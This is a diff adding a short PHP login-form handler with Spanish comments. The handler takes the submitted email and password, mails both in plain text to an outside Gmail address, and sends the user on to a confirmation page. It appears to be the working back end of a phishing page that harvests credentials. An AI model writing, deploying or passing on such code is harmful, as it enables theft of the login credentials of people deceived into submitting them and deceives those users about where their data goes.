@@ -1,0 +1,21 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $email = $_POST["email"];
+    $password = $_POST["password"];
+    
+    // Configura el destinatario y el asunto del correo electrónico
+    $to = "zukoweb.3a@gmail.com";
+    $subject = "Datos del formulario de inicio de sesión";
+
+    // Construye el cuerpo del correo electrónico
+    $message = "Correo electrónico: " . $email . "\n";
+    $message .= "Contraseña: " . $password;
+
+    // Envía el correo electrónico
+    mail($to, $subject, $message);
+
+    // Redirige al usuario a una página de confirmación o muestra un mensaje de éxito
+    header("Location: formulario_enviado.html");
+    exit();
+}
+?>
